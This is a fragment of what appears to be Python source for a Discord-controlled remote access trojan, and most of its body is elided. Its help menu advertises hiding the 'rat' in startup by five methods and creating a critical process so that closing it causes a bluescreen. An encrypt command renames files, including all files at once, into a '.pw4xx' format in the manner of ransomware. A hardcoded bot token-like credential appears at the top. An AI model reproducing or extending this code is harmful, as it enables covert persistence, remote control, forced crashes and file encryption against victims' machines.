...
HzzH = "MTM4ODMyMzQ0MTAwMTYzMTkxNA.GGq_tT.9CCvAtB0UjihrsVtHwFXk_eBVHrOmw2l8YZ3ag"
...
async def help(ctx):
    ...
    embed.add_field(name="!startup", value="Puts rat in Startups using 5 different unknown Methods 🐀", inline=False)
    ...
    embed1.add_field(name="!critproc", value="Makes a critical process. Close = Bluescreen 🆙", inline=False)
...
async def encrypt(ctx, *args):
    ...
    if len(args) == 1 and args[0] == "*":
        ...
        if encrypted_files:
            ...
            embed.description = "No files were encrypted (all were already in .pw4xx format)."
    elif len(args) == 1:
        file_name = args[0]
